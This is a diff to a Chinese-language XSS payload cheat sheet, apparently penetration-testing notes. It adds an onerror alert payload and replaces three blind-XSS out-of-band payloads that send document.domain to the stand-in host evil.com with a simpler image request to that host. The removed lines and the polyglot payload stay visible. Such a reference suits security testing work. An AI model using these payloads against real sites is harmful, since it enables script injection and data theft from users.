@@ -157,18 +157,16 @@ onkeyup=alert(1)        # 按键释放
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1);//'>
 ```
 
+经典 Payload
+
+```
+<img/src/onerror=alert(1)>
+```
+
 使用 OOB 测试 Blind XSS
 
 ```
-<img src=x onerror="new Image().src='https://evil.com?c='+document.domain;">
-```
-
-```
-<script>new Image().src="https://evil.com?c="+document.domain;</script>
-```
-
-```
-<script>navigator.sendBeacon("https://evil.com", document.domain);</script>
+<img/src=https://evil.com>
 ```
 
 ## 3. 文件解析类
